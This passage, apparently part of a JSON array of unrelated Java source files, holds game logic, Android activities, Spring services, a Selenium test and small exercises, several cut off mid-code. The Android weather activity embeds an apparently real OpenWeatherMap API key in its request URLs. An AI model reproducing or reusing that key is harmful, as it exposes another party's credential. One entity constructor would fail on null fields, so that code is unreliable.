\"&b\u5df2\u542f\u7528\u4e8c\u6bb5\u8df3\");\n        this.soundJump = settings.getConfiguration().getString(\"Settings.JumpSound\", \"ENTITY_BAT_TAKEOFF\");\n        this.soundRun = settings.getConfiguration().getString(\"Settings.SprintSound\", \"ENTITY_BLAZE_SHOOT\");\n\n        this.enableOnJoin = settings.getConfiguration().getBoolean(\"Settings.AutoToggleOnJoin\", true);\n        this.enableEnergy = settings.getConfiguration().getBoolean(\"Settings.UseEnergy\", false);\n        this.useLevel = settings.getConfiguration().getBoolean(\"Settings.EnergyWithLevel\", true);\n    }\n}\n",
    "package com.la.letsassemble.Entity;\n\nimport jakarta.persistence.*;\nimport lombok.Builder;\nimport lombok.Data;\nimport lombok.NoArgsConstructor;\nimport org.hibernate.annotations.CreationTimestamp;\nimport org.hibernate.annotations.OnDelete;\nimport org.hibernate.annotations.OnDeleteAction;\nimport org.springframework.stereotype.Repository;\n\nimport java.time.LocalDate;\n\n@Entity\n@NoArgsConstructor\n@Data\npublic class Buy_Option {\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long id;\n    @ManyToOne(fetch = FetchType.LAZY)\n    @JoinColumn(name = \"party_id\",referencedColumnName = \"id\",nullable = false)\n    @OnDelete(action = OnDeleteAction.CASCADE)\n    private Party party; // \ud30c\ud2f0 \uc544\uc774\ub514\n    @Column(nullable = false)\n    private String even_day; // \uc635\uc158 \uc2e4\ud589 \ub0a0\uc9dc\n    @Column(nullable = false,name = \"price\")\n    private int price; // \uac00\uaca9\n    @Column(nullable = false)\n    private String name; //\uc635\uc158 \uc774\ub984\n    @ManyToOne(fetch = FetchType.LAZY)\n    @JoinColumn(name = \"aplicant_id\",referencedColumnName = \"email\",nullable = false)\n    @OnDelete(action = OnDeleteAction.CASCADE)\n    private Users user; // \ud30c\ud2f0\uc7a5 \uc774\uba54\uc77c / \uc544\uc774\ub514\n    @Column(nullable = false,name = \"imp_uid\")\n    private String impUid; // \uacb0\uc81c \uace0\uc720\ubc88\ud638\n    @Column(nullable = false)\n    private String buy_day; // \uad6c\ub9e4 \uc77c\n    @Column(columnDefinition = \"TINYINT(1)\",nullable = false)\n    private boolean isOnline; // \uc628\ub77c\uc778 \uc5ec\ubd80\n\n    @PrePersist\n    private void prePersist(){\n        this.buy_day = LocalDate.now().toString();\n    }\n    @Builder\n    public Buy_Option(Long party_id, String even_day, int price, String name, String email, String imp_uid, boolean isOnline){\n        this.party.setId(party_id);\n        this.even_day = even_day;\n        this.price = price;\n        this.name =name;\n        this.user.setEmail(email);\n        this.impUid = imp_uid;\n        this.isOnline = isOnline;\n    }\n}\n",
    "package com.example.insta_weather;\n\nimport androidx.annotation.NonNull;\nimport androidx.appcompat.app.AlertDialog;\nimport androidx.appcompat.app.AppCompatActivity;\nimport androidx.appcompat.app.AppCompatDelegate;\nimport androidx.appcompat.widget.SearchView;\nimport androidx.core.app.ActivityCompat;\nimport androidx.swiperefreshlayout.widget.SwipeRefreshLayout;\n\nimport android.Manifest;\nimport android.annotation.SuppressLint;\nimport android.content.DialogInterface;\nimport android.content.Intent;\nimport android.content.pm.PackageManager;\nimport android.location.Location;\nimport android.location.LocationManager;\nimport android.os.Bundle;\nimport android.provider.Settings;\nimport android.view.Menu;\nimport android.view.MenuItem;\nimport android.view.View;\nimport android.widget.ImageView;\nimport android.widget.RelativeLayout;\nimport android.widget.TextView;\nimport android.widget.Toast;\n\nimport com.airbnb.lottie.LottieAnimationView;\nimport com.android.volley.Request;\nimport com.android.volley.RequestQueue;\nimport com.android.volley.Response;\nimport com.android.volley.VolleyError;\nimport com.android.volley.toolbox.JsonObjectRequest;\nimport com.android.volley.toolbox.Volley;\nimport com.bumptech.glide.Glide;\nimport com.google.android.gms.location.FusedLocationProviderClient;\nimport com.google.android.gms.location.LocationServices;\nimport com.google.android.gms.tasks.OnSuccessListener;\n\nimport org.json.JSONArray;\nimport org.json.JSONException;\nimport org.json.JSONObject;\n\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport java.util.Locale;\n\npublic class MainActivity extends AppCompatActivity {\n\n    TextView cityName, temperature, weatherDescription, dateAndTime, humidity, aqi, windSpeed, feelslike, pressure, loadingTextview, maxtemp, mintemp, visibility;\n    SearchView searchView;\n    ImageView imageview;\n\n    RelativeLayout relativeLayout,parentLayout;\n\n    LottieAnimationView lottieAnimationView;\n    TextView loadTV;\n\n\n    String urlMetrics = \"https://api.openweathermap.org/data/2.5/weather?lat=%s&lon=%s&appid=00b57cd25d3c916baef0cda450370eb3&units=metric\";\n    String urlForAqi = \"https://api.openweathermap.org/data/2.5/air_pollution?lat=%s&lon=%s&appid=00b57cd25d3c916baef0cda450370eb3\";\n    String urlSearchCity = \"https://api.openweathermap.org/data/2.5/weather?q=%s&appid=00b57cd25d3c916baef0cda450370eb3&units=metric\";\n    String tempUrl = urlSearchCity;\n    double lat,lon;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState)\n    {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        //to disable night mode in the app\n        AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO);\n\n        cityName = findViewById(R.id.city_tv);\n        temperature = findViewById(R.id.temp_tv);\n        weatherDescription = findViewById(R.id.description_tv);\n        dateAndTime = findViewById(R.id.date_time_tv);\n        humidity = findViewById(R.id.humidity);\n        aqi = findViewById(R.id.aqi);\n        windSpeed = findViewById(R.id.windSpeed);\n        feelslike = findViewById(R.id.feels_like);\n        pressure = findViewById(R.id.pressure);\n        imageview = findViewById(R.id.icon_iv);\n        mintemp = findViewById(R.id.min_tv);\n        maxtemp = findViewById(R.id.max_tv);\n        visibility = findViewById(R.id.visibility);\n        lottieAnimationView = findViewById(R.id.lottie);\n        loadTV= findViewById(R.id.loadingText);\n        relativeLayout=findViewById(R.id.holdingLayout);\n        parentLayout= findViewById(R.id.parent_layout);\n        SwipeRefreshLayout swipeRefreshLayout = findViewById(R.id.swipe_refresh);\n\n        swipeRefreshLayout.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {\n            @Override\n            public void onRefresh() {\n\n                makeRequest(urlMetrics,0);\n                swipeRefreshLayout.setRefreshing(false);\n            }\n        });\n        getLocation();\n\n\n    }\n\n    private void getLocation() {\n        //location manager\n        LocationManager locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);\n\n        //fusedLocationProvider\n        FusedLocationProviderClient fusedlocationProviderClient = LocationServices.getFusedLocationProviderClient(this);\n\n        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {\n\n            ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.ACCESS_COARSE_LOCATION,Manifest.permission.ACCESS_FINE_LOCATION},2);\n            return;\n        }\n        fusedlocationProviderClient.getLastLocation().addOnSuccessListener(new OnSuccessListener<Location>() {\n            @Override\n            public void onSuccess(Location location)\n            {\n             if(location!=null){\n                 lat = location.getLatitude();",
    "package game2048rendering;\n\n/** Symbolic names for the four sides of a board.\n *  @author P. N. Hilfinger */\npublic enum Side {\n    /** The parameters (COL0, ROW0, DCOL, and DROW) for each of the\n     *  symbolic directions, D, below are to be interpreted as follows:\n     *     The board's standard orientation has the top of the board\n     *     as NORTH, and rows and columns (see Model) are numbered\n     *     from its lower-left corner. Consider the board oriented\n     *     so that side D of the board is farthest from you. Then\n     *        * (COL0*s, ROW0*s) are the standard coordinates of the\n     *          lower-left corner of the reoriented board (where s is the\n     *          board size), and\n     *        * If (x, y) are the standard coordinates of a certain\n     *          square on the reoriented board, then (x+DCOL, y+DROW)\n     *          are the standard coordinates of the squares immediately\n     *          above it on the reoriented board.\n     *  The idea behind going to this trouble is that by using the\n     *  x() and y() methods below to translate from reoriented to\n     *  standard coordinates, one can arrange to use exactly the same code\n     *  to compute the result of tilting the board in any particular\n     *  direction. */\n\n    NORTH(0, 0, 0, 1),\n    EAST(0, 1, 1, 0),\n    SOUTH(1, 1, 0, -1),\n    WEST(1, 0, -1, 0);\n\n    /** The side that is in the direction (DCOL, DROW) from any square\n     *  of the board.  Here, \"direction (DCOL, DROW) means that to\n     *  move one space in the direction of this Side increases the row\n     *  by DROW and the colunn by DCOL.  (COL0, ROW0) are the row and\n     *  column of the lower-left square when sitting at the board facing\n     *  towards this Side. */\n    Side(int col0, int row0, int dcol, int drow) {\n        this._row0 = row0;\n        this._col0 = col0;\n        this._drow = drow;\n        this._dcol = dcol;\n    }\n\n    /** Return the standard x-coordinate for square (x, y) on a board\n     *  of size SIZE oriented with this Side on top. */\n    int x(int x, int y, int size) {\n        return _col0 * (size - 1) + x * _drow + y * _dcol;\n    }\n\n    /** Return the standard y-coordinate for square (x, y) on a board\n     *  of size SIZE oriented with this Side on top. */\n    int y(int x, int y, int size) {\n        return _row0 * (size - 1) - x * _dcol + y * _drow;\n    }\n\n    /** Parameters describing this Side, as documented in the comment at the\n     *  start of this class. */\n    private final int _row0, _col0, _drow, _dcol;\n}\n",
    "import java.io.FileWriter;\r\nimport java.io.IOException;\r\nimport java.nio.file.Files;\r\nimport java.nio.file.Path;\r\nimport java.nio.file.Paths;\r\nimport java.util.HashMap;\r\nimport java.util.Map;\r\nimport java.util.Random;\r\nimport java.util.zip.ZipEntry;\r\nimport java.util.zip.ZipOutputStream;\r\n\r\nenum TimeComplexity {\r\n    N(\"n\", (int) 1e8),\r\n    N_LOG_N(\"nlogn\", (int) 1e5),\r\n    N_SQUARED(\"n^2\", (int) 1e4),\r\n    EXPONENTIAL(\"2^n\", 20),\r\n    LOG_N(\"logn\", (int) 1e9),\r\n    SQRT_N(\"sqrt(n)\", (int) 1e9);\r\n\r\n    final String complexityOrder;\r\n    final int numInputs;\r\n\r\n    TimeComplexity(String complexityOrder, int numInputs) {\r\n        this.complexityOrder = complexityOrder;\r\n        this.numInputs = numInputs;\r\n    }\r\n}\r\n\r\npublic class TestCaseGenerator {\r\n    private static final String TEST_CASE_FOLDER = \"test_cases\";\r\n    private static final String INPUT_FOLDER = TEST_CASE_FOLDER + \"/in\";\r\n    private static final String OUTPUT_FOLDER = TEST_CASE_FOLDER + \"/out\";\r\n    private static final String ZIP_FILE = \"problem.zip\";\r\n\r\n    public static void main(String[] args) {\r\n        // ----------------- INPUT SIZE -----------------\r\n        TimeComplexity order = TimeComplexity.N_LOG_N;\r\n        int numInputs = order.numInputs / 2;\r\n\r\n        // ----------------- INPUT CONDITION -----------------\r\n        generateTestCases(\r\n            numInputs, //numInputs\r\n            1, //testCaseStart\r\n            1, //testCaseEnd\r\n            -100000, //numRangeMin\r\n            100000, //numRangeMax\r\n            2, //minNumOccurrences\r\n            20 //maxNumOccurrences\r\n        );\r\n    }\r\n\r\n    public static void generateTestCases(int numInputs, int testCaseStart, int testCaseEnd, int numRangeMin, int numRangeMax, int minNumOccurrences, int maxNumOccurrences) {\r\n        for (int i = testCaseStart; i <= testCaseEnd; i++) {\r\n            int[] arr = getRandomList(numInputs, numRangeMin, numRangeMax, minNumOccurrences, maxNumOccurrences);\r\n\r\n            String inputFileName = INPUT_FOLDER + \"/input\" + i + \".txt\";\r\n            String outputFileName = OUTPUT_FOLDER + \"/output\" + i + \".txt\";\r\n\r\n            generateInputFile(inputFileName, numInputs, arr);\r\n            generateOutputFile(outputFileName, arr);\r\n        }\r\n        zipFolders();\r\n    }\r\n\r\n    private static int getRandomNumber(int max, int min) {\r\n        return min + (int) (Math.random() * ((max - min) + 1));\r\n    }\r\n\r\n    private static int[] getRandomList(int len, int max, int min, int minOccurrences, int maxOccurrences) {\r\n        int[] randomList = new int[len];\r\n        Map<Integer, Boolean> seenNumbers = new HashMap<>();\r\n\r\n        int index = 0;\r\n        while (index < len) {\r\n            int potentialNumber = getRandomNumber(max, min);\r\n            if (!seenNumbers.containsKey(potentialNumber)) {\r\n                seenNumbers.put(potentialNumber, true);\r\n\r\n                int count = getRandomNumber(maxOccurrences, minOccurrences);\r\n                for (int i = 0; i < Math.min(count, len - index + 1); i++) {\r\n                    randomList[index++] = potentialNumber;\r\n                }\r\n            }\r\n        }\r\n\r\n        shuffleList(randomList);\r\n        return randomList;\r\n    }\r\n\r\n    private static void shuffleList(int[] randomList) {\r\n        Random rand = new Random();\r\n        int len = randomList.length;\r\n\r\n        for (int i = len - 1; i > 0; i--) {\r\n            int j = rand.nextInt(i + 1);\r\n            int temp = randomList[i];\r\n            randomList[i] = randomList[j];\r\n            randomList[j] = temp;\r\n        }\r\n    }\r\n\r\n    private static void generateInputFile(String fileName, int n, int[] arr) {\r\n        try {\r\n            Path inputPath = Paths.get(fileName);\r\n            Files.createDirectories(inputPath.getParent());\r\n            FileWriter writer = new FileWriter(fileName);\r\n            // ----------------- INPUT FORMAT -----------------\r\n            writer.write(n + \"\\n\");\r\n            for (int i = 0; i < n; i++) {\r\n                writer.write(arr[i] + \" \");\r\n            }\r\n            // ----------------- INPUT FORMAT -----------------\r\n            writer.close();\r\n        } catch (IOException e) {\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n\r\n    private static void generateOutputFile(String fileName, int[] arr) {\r\n        try {\r\n            Path outputPath = Paths.get(fileName);\r\n            Files.createDirectories(outputPath.getParent());\r\n            FileWriter writer = new FileWriter(fileName);\r\n            // ----------------- OUTPUT FORMAT -----------------\r\n            int ans = Solution.questionSolution(arr);\r\n            writer.write(String.valueOf(ans));\r\n            // ----------------- OUTPUT FORMAT -----------------\r\n            writer.close();\r\n        } catch (IOException e) {\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n\r\n    public static void zipFolders() {\r\n        try (ZipOutputStream zipOut = new ZipOutputStream(Files.newOutputStream(Paths.get(ZIP_FILE)))) {\r\n            addFolderToZip(INPUT_FOLDER",
    "package team.haedal.gifticionfunding.service.gifticon;\n\nimport java.time.LocalDate;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Optional;\nimport java.util.stream.Collectors;\nimport java.util.stream.IntStream;\nimport lombok.RequiredArgsConstructor;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.PageRequest;\nimport org.springframework.stereotype.Service;\nimport team.haedal.gifticionfunding.dto.common.PagingResponse;\nimport team.haedal.gifticionfunding.dto.gifticon.request.GifticonPurchaseRequest;\nimport team.haedal.gifticionfunding.dto.gifticon.response.GifticonDetailResponse;\nimport team.haedal.gifticionfunding.dto.gifticon.response.GifticonDto;\nimport team.haedal.gifticionfunding.dto.gifticon.response.UserGifticonDto;\nimport team.haedal.gifticionfunding.entity.gifticon.Gifticon;\nimport team.haedal.gifticionfunding.entity.gifticon.UserGifticon;\nimport team.haedal.gifticionfunding.entity.user.User;\nimport team.haedal.gifticionfunding.handler.ex.CustomApiException;\nimport team.haedal.gifticionfunding.repository.gifticon.GifticonRepository;\nimport team.haedal.gifticionfunding.repository.user.UserGifticonRepository;\n\n@Service\n@RequiredArgsConstructor\npublic class GifticonService {\n    private final GifticonRepository gifticonRepository;\n    private final UserGifticonRepository userGifticonRepository;\n    public PagingResponse<GifticonDto> getGifticonPaging(int page, int size) {\n        Page<Gifticon> gifticonPage =  gifticonRepository.findAll(PageRequest.of(page, size));\n        return PagingResponse.<GifticonDto>builder()\n                .hasNext(gifticonPage.hasNext())\n                .data(gifticonPage.map(GifticonDto::from).toList())\n                .build();\n    }\n\n    public GifticonDetailResponse getGifticonDetail(Long gifticonId) {\n        Optional<Gifticon> gifticon = gifticonRepository.findById(gifticonId);\n        if (gifticon.isEmpty()) {\n            throw new CustomApiException(\"\uc874\uc7ac\ud558\uc9c0 \uc54a\ub294 \uae30\ud504\ud2f0\ucf58\uc785\ub2c8\ub2e4.\");\n        }\n        return GifticonDetailResponse.from(gifticon.get());\n    }\n\n    public List<UserGifticonDto> purchaseGifticon(Long gifticonId, GifticonPurchaseRequest gifticonPurchaseRequest, User user) {\n        Optional<Gifticon> gifticon = gifticonRepository.findById(gifticonId);\n        if (gifticon.isEmpty()) {\n            throw new CustomApiException(\"\uc874\uc7ac\ud558\uc9c0 \uc54a\ub294 \uae30\ud504\ud2f0\ucf58\uc785\ub2c8\ub2e4.\");\n        }\n        List<UserGifticon> userGifticons = IntStream.range(0, gifticonPurchaseRequest.quantity())\n                .mapToObj(i -> UserGifticon.builder()\n                        .gifticon(gifticon.get())\n                        .buyer(user)\n                        .owner(user)\n                        .expirationDate(LocalDate.now().plusDays(gifticon.get().getExpirationPeriod()))\n                        .build())\n                .collect(Collectors.toList());\n\n        List<UserGifticon> purchasedGifticons = userGifticonRepository.saveAll(userGifticons);\n        return purchasedGifticons.stream()\n                .map(UserGifticonDto::from)\n                .toList();\n    }\n}\n",
    "package automationTesting;\r\n\r\nimport java.time.Duration;\r\n\r\nimport org.openqa.selenium.By;\r\nimport org.openqa.selenium.WebElement;\r\nimport org.openqa.selenium.chrome.ChromeDriver;\r\nimport org.openqa.selenium.support.ui.ExpectedConditions;\r\nimport org.openqa.selenium.support.ui.WebDriverWait;\r\n\r\npublic class FirstTest {\r\n\r\n\tpublic static void main(String[] args) {\r\n\t\t\r\n\t\tSystem.setProperty(\"webdreiver.chrome.driver\", \"C:\\\\browserdrivers\");\r\n\t\t\r\n\t\tChromeDriver driver = new ChromeDriver();\r\n\t\tWebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(10));\r\n\t\t\r\n\t\t// Navigate to YouTube\r\n\t\tdriver.get(\"https://colorhunt.co/\");\r\n\t\t\r\n\t\tWebElement colorBox = wait.until(ExpectedConditions.visibilityOfElementLocated(By.xpath(\"//div[@class='color']\")));\r\n        String colorCode = colorBox.getText();\r\n        System.out.println(\"Color code: \" + colorCode);\r\n        \r\n        WebElement randomMenu = driver.findElement(By.xpath(\"//a[contains(text(),'Random')]\"));\r\n        randomMenu.click();\r\n\r\n        \r\n        wait.until(ExpectedConditions.urlContains(\"/random\"));\r\n        \r\n        String currentUrl = driver.getCurrentUrl();\r\n        if (currentUrl.contains(\"/random\")) {\r\n            System.out.println(\"Random menu works. Page changed to a random color palette.\");\r\n        } else {\r\n            System.out.println(\"Random menu doesn't work.\");\r\n        }\r\n\r\n        // Close the browser\r\n        driver.quit();\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t}\r\n\r\n}\r\n",
    "package com.example.navdrawerexample;\n\nimport android.os.Bundle;\nimport android.view.MenuItem;\n\nimport androidx.annotation.NonNull;\nimport androidx.appcompat.app.ActionBarDrawerToggle;\nimport androidx.appcompat.app.AppCompatActivity;\nimport androidx.appcompat.widget.Toolbar;\nimport androidx.drawerlayout.widget.DrawerLayout;\n\nimport com.example.navdrawerexample.fragments.MakananFavorite;\nimport com.example.navdrawerexample.fragments.MakananKhas;\nimport com.example.navdrawerexample.fragments.MinumanKhas;\nimport com.google.android.material.navigation.NavigationView;\n\npublic class MainActivity extends AppCompatActivity {\n    private DrawerLayout drawerLayout;\n    private ActionBarDrawerToggle toggle;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        Toolbar toolbar = findViewById(R.id.toolbar);\n        setSupportActionBar(toolbar);\n\n        showHomePage();\n\n        drawerLayout = findViewById(R.id.drawer_layout);\n        toggle = new ActionBarDrawerToggle(\n                this, drawerLayout, toolbar, R.string.open_drawer, R.string.close_drawer);\n\n        drawerLayout.addDrawerListener(toggle);\n        getSupportActionBar().setDisplayHomeAsUpEnabled(true);\n        getSupportActionBar().setHomeButtonEnabled(true);\n\n        NavigationView navigationView = findViewById(R.id.nav_view);\n        navigationView.setNavigationItemSelectedListener(new NavigationView.OnNavigationItemSelectedListener() {\n            @Override\n            public boolean onNavigationItemSelected(@NonNull MenuItem item) {\n                int itemId = item.getItemId();\n\n                if (itemId == R.id.menu_item1) {\n                    showHomePage();\n                } else if(itemId == R.id.menu_item2){\n                    getSupportFragmentManager().beginTransaction()\n                            .replace(R.id.content_frame, new MinumanKhas())\n                            .commit();\n                    getSupportActionBar().setTitle(\"Minuman khas\");\n                }else {getSupportFragmentManager().beginTransaction()\n                        .replace(R.id.content_frame, new MakananFavorite())\n                        .commit();\n                    getSupportActionBar().setTitle(\"Makanan Fav\");}\n\n                drawerLayout.closeDrawers();\n                return true;\n            }\n        });\n    }\n\n    @Override\n    protected void onPostCreate(Bundle savedInstanceState) {\n        super.onPostCreate(savedInstanceState);\n        toggle.syncState();\n    }\n\n    private void showHomePage() {\n        getSupportFragmentManager().beginTransaction()\n                .replace(R.id.content_frame, new MakananKhas())\n                .commit();\n\n        getSupportActionBar().setTitle(\"Makanan Khas\");\n    }\n\n}\n",
    "package controller;\n\nimport entity.Doctor;\nimport model.DoctorModel;\n\nimport javax.swing.*;\nimport java.util.List;\n\npublic class DoctorController {\n\n    private DoctorModel doctorModel;\n\n    public DoctorController(){\n        doctorModel = new DoctorModel();\n    }\n\n    public String showAllDoctors() {\n        StringBuilder message = new StringBuilder();\n        message.append(\"......:::::::All Doctors:::::::......\");\n        List<Object> list = doctorModel.findAll();\n        if (!list.isEmpty()) {\n            for (Object object : list) {\n                Doctor doctor = (Doctor) object;\n                message.append(\"\\nID: \").append(doctor.getIdDoctor())\n                        .append(\"\\nName: \").append(doctor.getName())\n                        .append(\"\\nLast name: \").append(doctor.getLastName())\n                        .append(\"\\nSpecialty ID: \").append(doctor.getIdSpecialty())\n                        .append(\"\\n\");\n            }\n            return message.toString();\n        }\n        return message.append(\"\\nThere are no doctors in this list\").toString();\n    }\n\n    public void createDoctor() {\n        StringBuilder message = new StringBuilder();\n        message.append(\"Doctor\");\n\n        try{\n            String name = JOptionPane.showInputDialog(null, \"Enter the doctor name\");\n            String lastName = JOptionPane.showInputDialog(null, \"Enter the doctor last name\");\n            int specialtyID = Integer.parseInt(JOptionPane.showInputDialog(null, \"Enter the doctor specialtyID\"));\n            Doctor doctor = new Doctor();\n            doctor.setName(name);\n            doctor.setLastName(lastName);\n            doctor.setIdSpecialty(specialtyID);\n            doctor = (Doctor) doctorModel.insert(doctor);\n            if (doctor.getIdDoctor() != 0) {\n                message.append(\"\\nName: \").append(doctor.getName())\n                        .append(\"\\nLast name: \").append(doctor.getLastName())\n                        .append(\"\\nSpecialty id: \").append(doctor.getIdSpecialty());\n                JOptionPane.showMessageDialog(null, message.toString());\n            }\n        }catch (Exception e){\n            JOptionPane.showMessageDialog(null, \"Enter a number\");\n        }\n    }\n\n    public void updateDoctor() {\n        StringBuilder message = new StringBuilder();\n        message.append(showAllDoctors()).append(\"\\nEnter the id to update\");\n        try {\n            int found = Integer.parseInt(JOptionPane.showInputDialog(null, message.toString()));\n            Doctor doctor = (Doctor) doctorModel.findById(found);\n            if (doctor != null) {\n                String name = JOptionPane.showInputDialog(null, \"Enter the doctor name\", doctor.getName());\n                String lastName = JOptionPane.showInputDialog(null, \"Enter the doctor hour\", doctor.getLastName());\n                int specialtyID = Integer.parseInt(JOptionPane.showInputDialog(null, \"Enter the doctor specialtyID\",doctor.getIdSpecialty()));\n\n                doctor.setName(name);\n                doctor.setLastName(lastName);\n                doctor.setIdSpecialty(specialtyID);\n\n                if (doctorModel.update(doctor)) {\n                    JOptionPane.showMessageDialog(null, \"Doctor updated\");\n                }\n            } else {\n                JOptionPane.showMessageDialog(null, \"Doctor doesn't exist\");\n            }\n        } catch (Exception e) {\n            JOptionPane.showMessageDialog(null, \"Enter a number\");\n        }\n    }\n\n    public void deleteDoctor() {\n        StringBuilder message = new StringBuilder();\n        message.append(showAllDoctors()).append(\"\\nEnter the id to delete\");\n        try {\n            int found = Integer.parseInt(JOptionPane.showInputDialog(null, message.toString()));\n            if (doctorModel.delete(found)) {\n                JOptionPane.showMessageDialog(null, \"Doctor deleted\");\n            } else {\n                JOptionPane.showMessageDialog(null, \"Error when eliminating the doctor\");\n            }\n        } catch (Exception e) {\n            JOptionPane.showMessageDialog(null, \"doctor doesn't exist\");\n        }\n    }\n\n    public void findDoctorByID() {\n        StringBuilder message = new StringBuilder();\n        message.append(\"The doctor\");\n        try {\n            int found = Integer.parseInt(JOptionPane.showInputDialog(null, \"\\nEnter the id to find\"));\n            Doctor doctor = (Doctor) doctorModel.findById(found);\n            if (doctor != null){\n                message.append(\"\\nID: \").append(doctor.getIdDoctor())\n                        .append(\"\\nName: \").append(doctor.getName())\n                        .append(\"\\nLast name: \").append(doctor.getLastName())\n                        .append(\"\\nSpecialty id: \").append(doctor.getIdSpecialty());\n\n                JOptionPane.showMessageDialog(null,message.toString());\n            }\n        } catch (Exception e) {\n            JOptionPane.showMessageDialog(null, \"Doctor doesn't exist\");\n        }\n    }\n\n    public void findDoctorByIDDetailed() {\n  ",
    "package tree;\n\n\n\npublic class BinaryTreeTraversal {\n\n    // \u524d\u5e8f\u904d\u5386\n    public void preorderTraversal(TreeNode root) {\n        if (root != null) {\n            System.out.print(root.val + \" \"); // \u8bbf\u95ee\u6839\u8282\u70b9\n            preorderTraversal(root.left); // \u904d\u5386\u5de6\u5b50\u6811\n            preorderTraversal(root.right); // \u904d\u5386\u53f3\u5b50\u6811\n        }\n    }\n\n    // \u4e2d\u5e8f\u904d\u5386\n    public void inorderTraversal(TreeNode root) {\n        if (root != null) {\n            inorderTraversal(root.left); // \u904d\u5386\u5de6\u5b50\u6811\n            System.out.print(root.val + \" \"); // \u8bbf\u95ee\u6839\u8282\u70b9\n            inorderTraversal(root.right); // \u904d\u5386\u53f3\u5b50\u6811\n        }\n    }\n\n    // \u540e\u5e8f\u904d\u5386\n    public void postorderTraversal(TreeNode root) {\n        if (root != null) {\n            postorderTraversal(root.left); // \u904d\u5386\u5de6\u5b50\u6811\n            postorderTraversal(root.right); // \u904d\u5386\u53f3\u5b50\u6811\n            System.out.print(root.val + \" \"); // \u8bbf\u95ee\u6839\u8282\u70b9\n        }\n    }\n\n    public static void main(String[] args) {\n        // \u6784\u5efa\u793a\u4f8b\u4e8c\u53c9\u6811\n        TreeNode root = new TreeNode(1);\n        root.left = new TreeNode(2);\n        root.right = new TreeNode(3);\n        root.left.left = new TreeNode(4);\n        root.left.right = new TreeNode(5);\n        root.left.left.left = new TreeNode(8);\n        root.left.left.right = new TreeNode(9);\n        root.left.right.left = new TreeNode(10);\n        root.right.left = new TreeNode(6);\n        root.right.right = new TreeNode(7);\n        root.right.left.left = new TreeNode(11);\n        root.right.left.right = new TreeNode(12);\n        root.right.right.left = new TreeNode(13);\n\n        BinaryTreeTraversal tree = new BinaryTreeTraversal();\n\n        System.out.print(\"Preorder traversal: \");\n        tree.preorderTraversal(root);\n        System.out.println();\n\n        System.out.print(\"Inorder traversal: \");\n        tree.inorderTraversal(root);\n        System.out.println();\n\n        System.out.print(\"Postorder traversal: \");\n        tree.postorderTraversal(root);\n        System.out.println();\n    }\n}\n",
    "import java.util.Random;\r\nimport java.util.Scanner;\r\n\r\npublic class GuessTheNumber {\r\n    public static void main(String[] args) {\r\n        final int MAX_NUMBER = 100;\r\n        final int MIN_NUMBER = 1;\r\n        \r\n        Random random = new Random();\r\n        int secretNumber = random.nextInt(MAX_NUMBER - MIN_NUMBER + 1) + MIN_NUMBER;\r\n        Scanner scanner = new Scanner(System.in);\r\n        int attempts = 0;\r\n\r\n        System.out.println(\"Welcome to Guess the Number Game!\");\r\n        System.out.println(\"I've picked a number between 1 and 100. Can you guess it?\");\r\n\r\n        while (true) {\r\n            System.out.print(\"Enter your guess: \");\r\n            int guess = scanner.nextInt();\r\n            attempts++;\r\n\r\n            if (guess < secretNumber) {\r\n                System.out.println(\"Too low, try again.\");\r\n            } else if (guess > secretNumber) {\r\n                System.out.println(\"Too high, try again.\");\r\n            } else {\r\n                System.out.println(\"Congratulations! You've guessed the number \" + secretNumber + \" in \" + attempts + \" attempts.\");\r\n                break;\r\n            }\r\n        }\r\n\r\n        scanner.close();\r\n    }\r\n}",
    "package Cartas;\r\n\r\nimport Estadisticas.Estadistica.NivelExcedidoException;\r\nimport Estadisticas.Estadistica.NivelInvalidoException;\r\nimport Juego.Personaje;\r\n\r\npublic class Carta extends Opcion{\r\n\t\r\n\tprivate Opcion opcionA;\r\n\tprivate Opcion opcionB;\r\n\tprivate String descripcion;\r\n\t\r\n\tpublic Carta() {\r\n\t\topcionA = new Opcion();\r\n\t\topcionB = new Opcion();\r\n\t\tdescripcion = null;\r\n\t}\r\n\t\r\n\tpublic void elegirOpcion(Personaje personaje, int[] opcionA, int[] opcionB, String opcion) throws NivelExcedidoException, NivelInvalidoException {\r\n\t\tif(opcion.equals(\"A\")) {\r\n\t\t\tthis.opcionA.modificarEstadisticas(personaje, opcionA);\r\n\t\t}\r\n\t\telse if(opcion.equals(\"B\")){\r\n\t\t\tthis.opcionB.modificarEstadisticas(personaje, opcionB);\r\n\t\t}\r\n\t\t\r\n\t}\r\n\t\r\n\tpublic String verOpcion(Opcion opcion) {\r\n\t\tif(opcion == this.opcionA) {\r\n\t\t\treturn opcionA.getInformacion();\r\n\t\t}\r\n\t\telse{\r\n\t\t\treturn opcionB.getInformacion();\r\n\t\t}\r\n\t}\r\n\t\r\n\tpublic void setDescripcion(String descripcion) {\r\n\t\tthis.descripcion = descripcion;\r\n\t}\r\n\t\r\n\tpublic String getDescripcion() {\r\n\t\treturn descripcion;\r\n\t}\r\n\t\r\n\tpublic Opcion[] getOpciones() {\r\n\t\tOpcion[] opciones = {opcionA, opcionB};\r\n\t\treturn opciones;\r\n\t}\r\n}\r\n",
